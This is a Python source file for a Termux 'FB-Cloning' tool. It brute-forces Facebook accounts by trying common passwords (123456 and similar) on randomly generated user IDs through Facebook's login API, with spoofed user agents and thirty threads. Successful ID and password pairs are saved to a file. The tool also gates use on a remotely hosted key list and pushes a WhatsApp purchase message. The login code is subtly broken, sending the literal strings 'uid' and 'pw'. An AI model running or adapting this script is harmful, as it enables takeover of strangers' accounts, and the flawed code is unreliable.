#DECODE BY NOOR
#FIXED BY NOOR
#__________/MODULE\__________#
import os,requests,uuid,base64,hashlib,zlib,subprocess,time,platform,bs4,json,sys,time,random
import re,subprocess,platform,struct,string,uuid,base64,zlib,httpx
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket,ssl,certifi
from concurrent.futures import ThreadPoolExecutor as ThreadPool
if ModuleNotFoundError:
    os.system('pip install httpx > /dev/null')
#__________/COLOR\__________#
orange = '\x1b[38;5;196m';yellow = '\x1b[38;5;208m';black = '\x1b[1;30m';rad = '\x1b[38;5;160m';green = '\x1b[38;5;46m';yelloww = '\x1b[1;33m';blue = '\x1b[38;5;6m';purple = '\x1b[1;35m';cyan = '\x1b[1;36m';white = '\x1b[1;37m';faltu = '\x1b[1;47m';pvt = '\x1b[1;0m';gren = '\x1b[38;5;154m';gas = '\x1b[1;32m';orange = '\x1b[38;5;196m';yellow = '\x1b[38;5;208m';black = '\x1b[1;30m';red = '\x1b[38;5;160m';green = '\x1b[38;5;46m';yelloww = '\x1b[1;33m';blue = '\x1b[38;5;21m';purple = '\x1b[1;35m';cyan = '\x1b[1;36m';white = '\x1b[1;37m';faltu = '\x1b[1;47m';pvt = '\x1b[1;0m';gren = '\x1b[38;5;154m';gas = '\x1b[1;32m';A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\x1b[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\x1b[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';P = '\x1b[1;36m';O = '\x1b[1;35m';G = '\x1b[38;5;46m';G0 = '\x1b[38;5;46m';B = '\x1b[1;34m';G1 = '\x1b[38;5;47m';G2 = '\x1b[38;5;48m';G3 = '\x1b[38;5;49m';G4 = '\x1b[38;5;50m';G5 = '\x1b[38;5;51m';G6 = '\x1b[38;5;52m';s = '\x1b[0m';W = '\x1b[1;30m';Y = '\x1b[1;93m';R = '\x1b[1;91m';RE = '\x1b[1;31m';B = '\x1b[1;95m';BE = '\x1b[1;35m';X = '\x1b[1;96m';Z = '\x1b[1;95m';Y = '\x1b[1;93m';U = '\x1b[1;94m';V = '\x1b[38;5;47m';T = '\x1b[38;5;48m';Q = '\x1b[38;5;49m';P = '\x1b[38;5;50m';O = '\x1b[38;5;51m';N = '\x1b[38;5;52m';M = '\x1b[38;5;53m';L = '\x1b[96;1m';K = '\x1b[1;91m';WH = '\x1b[1;97m'
#__________/STYLE\__________#
style = f'''{white}[{red}●{white}]''';style = f'''{G}[{X}◆{G}]{G}'''
#__________/RANDOM_COLOR\__________#
abir = random.choice(['\x1b[38;5;196m','\x1b[38;5;208m','\x1b[1;30m','\x1b[38;5;160m','\x1b[38;5;46m','\x1b[1;33m','\x1b[38;5;6m','\x1b[1;35m','\x1b[1;36m','\x1b[1;37m'])
colors = ['\x1b[1;91m','\x1b[1;92m','\x1b[1;93m','\x1b[1;94m','\x1b[1;95m','\x1b[1;96m','\x1b[1;97m']
xoxo = random.choice(colors)
my_color = [white,blue,green]
warna = random.choice(my_color)
#__________/LOOP\__________#
loop=0;show_link = [];oks = [];cps = [];twf = [];user = []
#__________/UA\__________#
def windows():
    aV = str(random.choice(range(10, 20)))
    A = f'''Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'''
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'''5{bx}.{bV}'''
    B = f'''Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'''
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'''5{cx}.{cV}'''
    C = f'''Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'''
    D = f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'''
    return random.choice([A,B,C,D])
#__________/CLEAR\__________#
def clear():os.system('clear');____banner____()
def linex():print(f'''{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
#__________/BANNER\__________#
def ____banner____():
    if 'win' in sys.platform:
        os.system('clear')
    #os.system('xdg-open https://facebook.com/groups/httpsm.facebook.comgrouptermuxhackershamim/')
    print(f'''  
╭━━━┳╮╱╭┳━━━┳━╮╭━┳━━┳━╮╭━╮╱╱╭━━━┳╮╱╱╭┳━━╮╭━━━┳━━━╮
┃╭━╮┃┃╱┃┃╭━╮┃┃╰╯┃┣┫┣┫┃╰╯┃┃╱╱┃╭━╮┃╰╮╭╯┃╭╮┃┃╭━━┫╭━╮┃
┃╰━━┫╰━╯┃┃╱┃┃╭╮╭╮┃┃┃┃╭╮╭╮┃╱╱┃┃╱╰┻╮╰╯╭┫╰╯╰┫╰━━┫╰━╯┃
╰━━╮┃╭━╮┃╰━╯┃┃┃┃┃┃┃┃┃┃┃┃┃┣━━┫┃╱╭╮╰╮╭╯┃╭━╮┃╭━━┫╭╮╭╯
┃╰━╯┃┃╱┃┃╭━╮┃┃┃┃┃┣┫┣┫┃┃┃┃┣━━┫╰━╯┃╱┃┃╱┃╰━╯┃╰━━┫┃┃╰╮
╰━━━┻╯╱╰┻╯╱╰┻╯╰╯╰┻━━┻╯╰╯╰╯╱╱╰━━━╯╱╰╯╱╰━━━┻━━━┻╯╰━╯ 

\x1b[1;96m  ┏━━━━━━━━━━━━━━━━━━━\x1b[38;5;46m𝚂𝙷𝙰𝙼𝙸𝙼\x1b[1;39m\x1b[1;96m━━━━━━━━━━━━━━━━━━━━━┓
\x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\x1b[1;34m        : [★] SHAMIM HOSSEN\x1b[1;39m            
\x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\x1b[1;34m    : [★] 𝐓𝐄𝐑𝐌𝐔𝐱 𝐇𝐀𝐂𝐊𝐄𝐑 𝐒𝐇𝐀𝐌𝐈𝐌\x1b[1;39m   
\x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\x1b[1;34m      : [★] 𝗦𝗛𝗔𝗠𝗜𝗠-𝗖𝗬𝗕𝗘𝗥 \x1b[1;39m          
\x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\x1b[1;34m  : [★] 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\x1b[1;39m        
\x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\x1b[1;34m    : [★] +𝟴𝟴𝟬𝟭𝟴𝟴𝟰𝟮𝟱𝟬𝟬𝟵𝟳\x1b[1;39m     
\x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\x1b[1;34m  : [★] FB-𝐂𝐋𝐎𝐍𝐈𝐍𝐆\x1b[1;39m     
\x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\x1b[1;34m: [★] UPDATE \x1b[38;5;46m [v 1.8.5]\x1b[38;5;46m           
\x1b[1;96m   ┗━━━━━━━━━━━━━━━━━━━\x1b[1;31m𝚂𝙷𝙰𝙼𝙸𝙼\x1b[1;39m\x1b[1;96m━━━━━━━━━━━━━━━━━━━━┛\x1b[1;96m''')
#__________/APROVEL\__________#
def main_apv():
    clear()
    uuid = str(os.geteuid())
    key = f'''shamim{uuid!s}'''
    clear()
    print('\x1b[1;34m[\x1b[38;5;46m×\x1b[1;34m] \x1b[1;37m|\x1b[38;5;46mKEY\x1b[1;37m|\x1b[38;5;196m' + key)
    print('\x1b[1;37m═════════════════════════════════════════')
    system = httpx.get('https://raw.githubusercontent.com/Noor-143/Control-room/main/Aprv.txt').text
    if key in system:
        print()
        msg = str(os.geteuid())
        time.sleep(1)
        _old_()
    print(f'''{white}╭────────────────────────────────────────╮''')
    print(f'''{white}│\x1b[1;100m/•YOURE\x1b[00m\x1b[1;91m\x1b[47mNAME•/\x1b[00m{white}''')
    print(f'''{white}╰─ ┌─────────────────────────────────────╯''')
    enter = input(f'''{white}   └──> {white}<{red}/{white}ENTER{red}/{white}>  ''')
    os.system('clear')
    print('\x1b[1;34m[\x1b[38;5;46m×\x1b[1;34m] \x1b[1;37m|\x1b[38;5;46mKEY\x1b[1;37m|\x1b[38;5;196m' + key)
    print('\x1b[1;37m═════════════════════════════════════════')
    print(f'''{white}╭────────────────╮      ╭────────────────╮''')
    print(f'''{white}│\x1b[1;100m/•TOOLS\x1b[00m\x1b[1;91m\x1b[47mPAID•/\x1b[00m{white}│{G1}[{Y}×/''' + f'''×{G1}] {white}│\x1b[1;100m/•YOU3X\x1b[00m\x1b[1;91m\x1b[47mWARNING•/\x1b[00m{white}│''')
    print(f'''{white}╰────────────────╯      ╰────────────────╯''')
    print(f'''{white}            ╭────────────────╮''')
    print(f'''     {G1}[{Y}×/''' + f'''/×{G1}] {white}│\x1b[1;100m/•YOUR\x1b[00m\x1b[1;91m\x1b[47mCHOICE•/\x1b[00m{white}│''')
    print(f'''{white}            ╰────────────────╯''')
    print(f'''{white}╭────────────────────────────────────────╮''')
    print(f'''{white}│\x1b[1;100m/•YOU\'RE\x1b[00m\x1b[1;91m\x1b[47mNEXT•/\x1b[00m{white}│{G1}[{Y}×/''' + f'''×{G1}]{white}│\x1b[1;100m/•STEP\x1b[00m\x1b[1;91m\x1b[47mMENU•/\x1b[00m{white}│''')
    print(f'''{white}╰─ ┌─────────────────────────────────────╯''')
    Picchi = input(f'''{white}   └──> {white}<{red}/{white}ENTER{red}/{white}>  ''')
    os.system('clear')
    print(f'''{white}╭────────────────╮      ╭────────────────╮''')
    print(f'''{white}│\x1b[1;100m/•s3m\x1b[00m\x1b[1;91m\x1b[47mCOUNTRY•/\x1b[00m{white}│{G1}[{Y}×/''' + f'''\xc3\x97{G1}] {white}│\x1b[1;100m/ALL\'3\x1b[00m\x1b[1;91m\x1b[47mWORKING•/\x1b[00m{white}│''')
    print(f'''{white}╰────────────────╯      ╰────────────────╯''')
    print('\x1b[1;37m═════════════════════════════════════════')
    print(f'''{white}╭────────────────╮      ╭────────────────╮''')
    print(f'''{white}╰────────────────╯      ╰────────────────╯''')
    print(f'''{white}            ╭────────────────╮''')
    print(f'''     {G1}[{Y}×/''' + f'''/×{G1}] {white}│\x1b[1;100m/•OLD X \x1b[00m\x1b[1;91m\x1b[47mAUTO-FB•/\x1b[00m{white}│''')
    print(f'''{white}            ╰────────────────╯''')
    print(f'''{white}╭────────────────────────────────────────╮''')
    print(f'''{white}╰─ ┌─────────────────────────────────────╯''')
    Picchi = input(f'''{white}   └──> {white}<{red}/{white}ENTER{red}/{white}>  ''')
    os.system('clear')
    print('\x1b[1;34m[\x1b[38;5;46m×\x1b[1;34m] \x1b[1;37m|\x1b[38;5;46mKEY\x1b[1;37m|\x1b[38;5;196m' + key)
    print('\x1b[1;37m═════════════════════════════════════════')
    print(f'''{white}╭────────────────╮      ╭────────────────╮''')
    print(f'''{white}╭────────────────────────────────────────╮''')
    print(f'''{white}│\x1b[1;100m/•YOU\'RE\x1b[00m\x1b[1;91m\x1b[47mNEXT\'•/\x1b[00m{white}│{G1}[{Y}×/''' + f'''\xc3\x97{G1}]{white}│\x1b[1;100m/•STEP\x1b[00m\x1b[1;91m\x1b[47mADMIN•/\x1b[00m{white}│''')
    print(f'''{white}╰─ ┌─────────────────────────────────────╯''')
    choice = input(f'''{white}   └──> {white}<{red}/{white}ENTER{red}/{white}>  ''')
    url_wa = 'https://api.whatsapp.com/send?phone=+8801884250097&text='
    tks = 'Hi SHAMIM Sir, I Need To Buy Your EXO Tools Version 1.0 Premium Please Accept My Key To Premium\n\n Name : ' + enter + '\n : ' + choice + '\n Key : ' + key + '\n Buy Select : ' + Picchi
    subprocess.check_output(['am','start',url_wa + tks])
    time.sleep(2)
    print('\x1b[1;37m═════════════════════════════════════════\nRun\x1b[1;32m[\x1b[1;31m-\x1b[1;32m] \x1b[1;37m again with permission from admin')
    main_apv()
    sys.exit()
#__________/MENU\__________#
def _old_():
    clear();time.sleep(2);print(f'''{rad}[{white}A{rad}] {green} YOUR KEY HAS BEEN APRV''');clear();print(f'''{rad}[{white}A{rad}] {green}Old Id Clone''');print(f'''{rad}[{white}B{rad}] {green}ADMIN CONTACT''');linex();sharo = input(f'''{rad}[{white}◆{rad}] {green}Selection  {white}▶︎ {yelloww}''')
    if sharo in ('A', 'a', '01', '1'):__Old__()
    elif sharo in ('B', 'b', '02', '2'):_old_()
    #os.system('xdg-open https://api.whatsapp.com/send?phone=+8801884250097')
    else:print(f'''\n[×]{rad} Choose Value Option... ''');_old_()
#__________/OLD\__________#
def __Old__():
    clear();print(f'''{rad}[{white}1{rad}] Old code {yellow}:{green} 2010-2014''');ask = input(f'''{rad}[{white}◆{rad}] Select {yellow}:{green} ''');linex();clear();print(f'''{rad}[{white}◆{rad}] Example {yellow}:{green} 20000 / 30000 / 99999''');limit = input(f'''{rad}[{white}◆{rad}] Select {yellow}:{green} ''');linex()
    Xyz = input(f'''{white} Do you want to show Profile Link ? [y/n] : ''')
    if Xyz in ('y', 'Y', 'yes', 'Yes', '1'):
        show_link.append('y')
    show_link.append('n')
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    with ThreadPool(max_workers=30) as jihad:
        clear();print(f'''{rad}[{white}◆{rad}] Total Id From Crack {yellow}: {green} {limit}{white}''');print(f'''{rad}[{white}◆{rad}] Use Airplane Mod For Good Result{green}''');linex()
        for mal in user:
            uid=star+mal
            jihad.submit(login, uid)
    print('\033[1;37m');print(f'------------------------------------------------\nCRACK HAS BEEN COMPLETE\n------------------------------------------------')
#__________/METHOD-1\__________#
def login(uid):
    global oks,loop
    sys.stdout.write(f'''\r\r{yelloww} - {white}[{green}SHAMIM{white}]{yelloww} -{white} [{loop}{white}] {yelloww}- {white}[{green}OK {yelloww}- {green}{len(oks)}{white}]''');sys.stdout.flush()
    Session = requests.session()
    try:
        for pw in ('123456', '1234567', '123456789'):
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': 'uid', 'password': 'pw', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': windows(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}
            url = 'https://b-graph.facebook.com/auth/login'
            rp = requests.post(url, data = data, headers = head, allow_redirects = False, verify = True).json()
            if 'session_key' in rp:
                print(f'''\r\r{white}[{green}SHAMIM{yelloww}-{green}OK{white}] {green}{uid} | {white}[🔑]{pw}''')
                ProfileLink = f'''https://www.facebook.com/profile.php?id={str(uid)}'''
                if 'y' in show_link:
                    print(f'''\x1b[1;92m[PROFILE LINK]…[ 🍪 ] {ProfileLink}  ''');linex()
                open('/sdcard/SHAMIM-OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
                cps.append(uid)
            elif 'www.facebook.com' in rp['error']['message']:
                print(f'''\r\r{white}[{green}SHAMIM{yelloww}-{green}OK{white}] {green}{uid} | {white}[🔑]{pw}''')
                ProfileLink = f'''https://www.facebook.com/profile.php?id={str(uid)}'''
                if 'y' in show_link:
                    print(f'''\x1b[1;92m[PROFILE LINK]…[ 🍪 ] {ProfileLink}  ''');linex()
                open('/sdcard/SHAMIM-OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________/DATA-BASE\__________#
def server():
    database = requests.get('https://raw.githubusercontent.com/Noor-143/Control-room/main/ON-OFF-UPDATE-FREE-TRAIL.txt').text
    if 'on' in database:
        print('\x1b[38;5;46m[✔️TOOL IS ON')
    elif 'off' in database:
        print('\x1b[38;5;46m[✔️TOOL IS UPDATING')
        for j in range(4000):
            time.sleep(4)
            #os.system('xdg-open https://t.me/termux_hacker_shamim')
            print('\x1b[1;92m Tool is updating Wait For Complete The Update')
            print(' internet error ')
            sys.exit()
#__________/END-CALL\__________#
server();main_apv()
